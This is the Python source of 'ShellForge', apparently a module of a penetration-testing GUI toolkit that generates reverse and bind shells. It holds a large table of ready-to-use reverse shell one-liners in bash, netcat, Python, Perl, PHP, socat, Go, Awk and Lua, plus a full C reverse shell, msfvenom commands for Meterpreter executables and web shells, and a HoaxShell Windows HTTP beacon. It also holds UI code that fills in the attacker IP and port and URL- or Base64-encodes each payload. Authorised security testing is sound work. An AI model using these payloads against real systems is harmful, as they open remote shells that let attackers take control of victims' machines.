# =============================================================================
# modules/shellforge.py
#
# SHELLFORGE - Complete Reverse Shell Generator
# =============================================================================

import os
import base64
import urllib.parse
from datetime import datetime
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QFileDialog, QButtonGroup, QRadioButton, QListWidget, QListWidgetItem
)
from PySide6.QtCore import Qt

from modules.bases import ToolBase, ToolCategory
from ui.styles import (
    # Widgets
    RunButton, StopButton, BrowseButton,
    StyledLineEdit, StyledSpinBox, StyledCheckBox, StyledComboBox,
    StyledLabel, HeaderLabel, StyledGroupBox, OutputView,
    ToolSplitter, ConfigTabs, StyledToolView,
    # Behaviors
    SafeStop, OutputHelper,
    # Constants
    COLOR_BG_SECONDARY
)
from core.fileops import RESULT_BASE

# =============================================================================
# PAYLOAD DATA
# =============================================================================

SHELL_TYPES = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']

REVERSE = [
    {"name":"Bash -i","cmd":"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1","os":"linux"},
    {"name":"Bash 196","cmd":"0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196","os":"linux"},
    {"name":"Bash read line","cmd":"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done","os":"linux"},
    {"name":"Bash 5","cmd":"{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5","os":"linux"},
    {"name":"Bash udp","cmd":"{shell} -i >& /dev/udp/{ip}/{port} 0>&1","os":"linux"},
    {"name":"nc mkfifo","cmd":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f","os":"linux"},
    {"name":"nc -e","cmd":"nc {ip} {port} -e {shell}","os":"linux"},
    {"name":"nc.exe -e","cmd":"nc.exe {ip} {port} -e {shell}","os":"windows"},
    {"name":"BusyBox nc -e","cmd":"busybox nc {ip} {port} -e {shell}","os":"linux"},
    {"name":"nc -c","cmd":"nc -c {shell} {ip} {port}","os":"linux"},
    {"name":"ncat -e","cmd":"ncat {ip} {port} -e {shell}","os":"linux"},
    {"name":"ncat.exe -e","cmd":"ncat.exe {ip} {port} -e {shell}","os":"windows"},
    {"name":"ncat udp","cmd":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f","os":"linux"},
    {"name":"curl","cmd":"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null","os":"linux"},
    {"name":"rustcat","cmd":"rcat connect -s {shell} {ip} {port}","os":"linux"},
    {"name":"C","cmd":"#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));\n    dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2);\n    char * const argv[] = {\"{shell}\", NULL};\n    execvp(\"{shell}\", argv);\n    return 0;\n}","os":"linux"},
    {"name":"Perl","cmd":"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'","os":"linux"},
    {"name":"PHP exec","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'","os":"linux"},
    {"name":"PHP shell_exec","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'","os":"linux"},
    {"name":"PHP system","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'","os":"all"},
    {"name":"PHP passthru","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'","os":"linux"},
    {"name":"Python #1","cmd":"export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python #2","cmd":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python3 #1","cmd":"export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python3 #2","cmd":"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python3 shortest","cmd":"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Ruby #1","cmd":"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'","os":"linux"},
    {"name":"socat #1","cmd":"socat TCP:{ip}:{port} EXEC:{shell}","os":"linux"},
    {"name":"socat #2 (TTY)","cmd":"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane","os":"linux"},
    {"name":"Golang","cmd":"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go","os":"all"},
    {"name":"Awk","cmd":"awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null","os":"linux"},
    {"name":"Lua #1","cmd":"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"","os":"linux"},
]

BIND = [
    {"name":"Python3 Bind","cmd":"python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'","os":"all"},
    {"name":"PHP Bind","cmd":"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'","os":"all"},
    {"name":"nc Bind","cmd":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f","os":"linux"},
]

MSFVENOM = [
    {"name":"Windows Meterpreter Staged (x64)","cmd":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe","os":"windows"},
    {"name":"Windows Meterpreter Stageless (x64)","cmd":"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe","os":"windows"},
    {"name":"Linux Meterpreter Staged (x64)","cmd":"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf","os":"linux"},
    {"name":"Linux Stageless (x64)","cmd":"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf","os":"linux"},
    {"name":"PHP Reverse","cmd":"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php","os":"all"},
    {"name":"JSP Stageless","cmd":"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp","os":"all"},
    {"name":"WAR Stageless","cmd":"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war","os":"all"},
]

HOAXSHELL = [
    {"name":"Windows CMD cURL","cmd":"@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL","os":"windows"},
]

LISTENERS = [
    ("nc", "nc -lvnp {port}"),
    ("ncat", "ncat -lvnp {port}"),
    ("ncat (TLS)", "ncat --ssl -lvnp {port}"),
    ("rlwrap + nc", "rlwrap -cAr nc -lvnp {port}"),
    ("rustcat", "rcat listen {port}"),
    ("socat", "socat -d -d TCP-LISTEN:{port} STDOUT"),
    ("pwncat", "python3 -m pwncat -lp {port}"),
    ("msfconsole", "msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\""),
]

CATEGORIES = [("🔴 Reverse", REVERSE), ("⚫ Bind", BIND), ("🟢 MSFVenom", MSFVENOM), ("🟡 HoaxShell", HOAXSHELL)]


class ShellForgeTool(ToolBase):
    name = "ShellForge"
    category = ToolCategory.PAYLOAD_GENERATOR

    @property
    def description(self) -> str:
        return "Reverse shell generator with 100+ payloads."

    @property
    def icon(self) -> str:
        return "🐚"

    def get_widget(self, main_window):
        return ShellForgeView(main_window=main_window)


class ShellForgeView(StyledToolView, SafeStop, OutputHelper):
    """ShellForge interface."""
    
    tool_name = "ShellForge"
    tool_category = "PAYLOAD_GENERATOR"

    def __init__(self, main_window=None):
        super().__init__()
        self.main_window = main_window
        self.init_safe_stop()
        self.current_shells = REVERSE
        self._build_ui()
        self._update_shell_list()

    def _build_ui(self):
        """Build UI."""
        # setStyleSheet handled by StyledToolView
        
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        splitter = ToolSplitter()
        
        # ==================== CONTROL PANEL ====================
        control_panel = QWidget()
        # Removed legacy style
        control_layout = QVBoxLayout(control_panel)
        control_layout.setContentsMargins(10, 10, 10, 10)
        control_layout.setSpacing(10)
        
        # Header
        header = HeaderLabel(self.tool_category, self.tool_name)
        control_layout.addWidget(header)
        
        # Connection
        conn_group = StyledGroupBox("🔌 Connection")
        conn_layout = QHBoxLayout(conn_group)
        
        conn_layout.addWidget(StyledLabel("LHOST:"))
        self.ip_input = StyledLineEdit()
        self.ip_input.setPlaceholderText("10.10.14.5")
        self.ip_input.textChanged.connect(self._update_cmd)
        conn_layout.addWidget(self.ip_input, 1)
        
        detect_btn = BrowseButton("📍Detect")
        detect_btn.clicked.connect(self._detect_ip)
        conn_layout.addWidget(detect_btn)
        
        conn_layout.addWidget(StyledLabel("LPORT:"))
        self.port_input = StyledLineEdit("9001")
        self.port_input.setMaximumWidth(70)
        self.port_input.textChanged.connect(self._update_cmd)
        conn_layout.addWidget(self.port_input)
        
        control_layout.addWidget(conn_group)
        
        # Shell Type (sh, bash, etc)
        type_layout = QHBoxLayout()
        type_layout.addWidget(StyledLabel("Shell bin:"))
        self.shell_bin_combo = StyledComboBox()
        self.shell_bin_combo.addItems(SHELL_TYPES)
        self.shell_bin_combo.setCurrentText("/bin/bash")
        self.shell_bin_combo.currentTextChanged.connect(self._update_cmd)
        type_layout.addWidget(self.shell_bin_combo)
        control_layout.addLayout(type_layout)
        
        # Filter
        filter_group = StyledGroupBox("🔧 Filter & Category")
        filter_layout = QGridLayout(filter_group)
        
        # Category
        self.cat_combo = StyledComboBox()
        for name, _ in CATEGORIES:
            self.cat_combo.addItem(name)
        self.cat_combo.currentIndexChanged.connect(self._on_cat_change)
        
        # OS
        self.os_group = QButtonGroup(self)
        os_layout = QHBoxLayout()
        for i, (n, c) in enumerate([("All", ""), ("Linux", "linux"), ("Windows", "windows"), ("Mac", "mac")]):
            r = QRadioButton(n)
            # Styling radio buttons explicitly since they are tricky
            r.setStyleSheet("QRadioButton { color: #e5e7eb; } QRadioButton::indicator:checked { background-color: #f97316; }")
            if i == 0: r.setChecked(True)
            self.os_group.addButton(r, i)
            os_layout.addWidget(r)
        
        # Connect button group signal
        self.os_group.idClicked.connect(lambda: self._update_shell_list())

        # Search
        self.search_input = StyledLineEdit()
        self.search_input.setPlaceholderText("Filter payloads...")
        self.search_input.textChanged.connect(self._update_shell_list)
        
        filter_layout.addWidget(StyledLabel("Category:"), 0, 0)
        filter_layout.addWidget(self.cat_combo, 0, 1)
        filter_layout.addLayout(os_layout, 1, 0, 1, 2)
        filter_layout.addWidget(StyledLabel("Search:"), 2, 0)
        filter_layout.addWidget(self.search_input, 2, 1)
        
        control_layout.addWidget(filter_group)
        
        # Shell List
        self.shell_list = QListWidget()
        self.shell_list.setStyleSheet(f"background-color: #1E1E2E; border: 1px solid #333; color: white;")
        self.shell_list.currentRowChanged.connect(self._update_cmd)
        control_layout.addWidget(self.shell_list)
        
        control_layout.addStretch()
        splitter.addWidget(control_panel)
        
        # ==================== OUTPUT PANEL ====================
        output_panel = QWidget()
        output_layout = QVBoxLayout(output_panel)
        output_layout.setContentsMargins(10, 10, 10, 10)
        
        # Payload Output
        output_layout.addWidget(HeaderLabel("GENERATED", "Payload"))
        self.payload_output = OutputView(self.main_window)
        self.payload_output.setPlaceholderText("Select a payload generated command...")
        output_layout.addWidget(self.payload_output)
        
        # Encoding Buttons
        enc_layout = QHBoxLayout()
        self.enc_combo = StyledComboBox()
        self.enc_combo.addItems(["Plain", "URL Encoded", "Double URL", "Base64"])
        enc_layout.addWidget(self.enc_combo)
        
        copy_btn = RunButton("📋 Copy Payload")
        copy_btn.clicked.connect(self._copy_payload)
        enc_layout.addWidget(copy_btn)
        
        save_btn = BrowseButton("💾 Save to File") 
        save_btn.clicked.connect(self._save_payload)
        enc_layout.addWidget(save_btn)
        
        output_layout.addLayout(enc_layout)
        
        output_layout.addSpacing(20)
        
        # Listener Output
        output_layout.addWidget(HeaderLabel("LISTENER", "Command"))
        
        lis_layout = QHBoxLayout()
        self.lis_combo = StyledComboBox()
        for n, _ in LISTENERS:
            self.lis_combo.addItem(n)
        self.lis_combo.currentTextChanged.connect(self._update_lis)
        lis_layout.addWidget(self.lis_combo)
        
        copy_lis_btn = RunButton("📋 Copy Listener")
        copy_lis_btn.clicked.connect(self._copy_listener)
        lis_layout.addWidget(copy_lis_btn)
        
        output_layout.addLayout(lis_layout)
        
        self.listener_output = StyledLineEdit()
        self.listener_output.setReadOnly(True)
        output_layout.addWidget(self.listener_output)
        
        splitter.addWidget(output_panel)
        splitter.setSizes([400, 450])
        
        main_layout.addWidget(splitter)
        
        # Init
        self._detect_ip()
        self._update_lis()
        
    def _detect_ip(self):
        try:
            import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); self.ip_input.setText(s.getsockname()[0]); s.close()
        except: pass

    def _on_cat_change(self, idx):
        if 0 <= idx < len(CATEGORIES):
            self.current_shells = CATEGORIES[idx][1]
        self._update_shell_list()

    def _update_shell_list(self):
        os_filter_names = ["all", "linux", "windows", "mac"]
        os_idx = self.os_group.checkedId()
        if os_idx < 0: os_idx = 0
        os_f = os_filter_names[os_idx]
        
        search = self.search_input.text().lower()
        
        self.shell_list.clear()
        for s in self.current_shells:
            sos = s.get("os", "linux")
            if os_f != "all" and sos != "all" and os_f not in sos:
                continue
            if search and search not in s["name"].lower():
                continue
            self.shell_list.addItem(s["name"])
            
        if self.shell_list.count() > 0:
            self.shell_list.setCurrentRow(0)
        self._update_cmd()

    def _get_raw_cmd(self):
        idx = self.shell_list.currentRow()
        if idx < 0: return ""
        
        # Find item by text (since list is filtered)
        if not self.shell_list.currentItem():
             return ""
        item_text = self.shell_list.currentItem().text()
        
        payload_data = None
        for s in self.current_shells:
            if s["name"] == item_text:
                payload_data = s
                break
        
        if not payload_data: return ""
        
        cmd_template = payload_data.get("cmd", "")
        ip = self.ip_input.text() or "10.10.14.5"
        port = self.port_input.text() or "9001"
        shell_bin = self.shell_bin_combo.currentText()
        
        return cmd_template.replace("{ip}", ip).replace("{port}", port).replace("{shell}", shell_bin)

    def _update_cmd(self):
        raw = self._get_raw_cmd()
        self.payload_output.clear()
        self.payload_output.append(raw) # Display raw first
        self._update_lis()

    def _update_lis(self):
        idx = self.lis_combo.currentIndex()
        if 0 <= idx < len(LISTENERS):
            _, cmd = LISTENERS[idx]
            ip = self.ip_input.text() or "0.0.0.0"
            port = self.port_input.text() or "9001"
            payload = "windows/x64/meterpreter/reverse_tcp" # Default for msfconsole hint
            
            final_cmd = cmd.replace("{ip}", ip).replace("{port}", port).replace("{payload}", payload)
            self.listener_output.setText(final_cmd)

    def _get_encoded_payload(self):
        raw = self._get_raw_cmd()
        mode = self.enc_combo.currentText()
        
        if mode == "URL Encoded":
            return urllib.parse.quote(raw, safe='')
        elif mode == "Double URL":
            return urllib.parse.quote(urllib.parse.quote(raw, safe=''), safe='')
        elif mode == "Base64":
            return base64.b64encode(raw.encode()).decode()
        else:
            return raw

    def _copy_payload(self):
        from PySide6.QtWidgets import QApplication
        QApplication.clipboard().setText(self._get_encoded_payload())
        self._notify("Payload copied to clipboard!")

    def _copy_listener(self):
        from PySide6.QtWidgets import QApplication
        QApplication.clipboard().setText(self.listener_output.text())
        self._notify("Listener command copied!")

    def _save_payload(self):
        raw = self._get_encoded_payload()
        path, _ = QFileDialog.getSaveFileName(self, "Save Payload", os.path.join(RESULT_BASE, f"shell.sh"))
        if path:
            with open(path, 'w') as f:
                f.write(raw)
            self._notify(f"Saved to {path}")
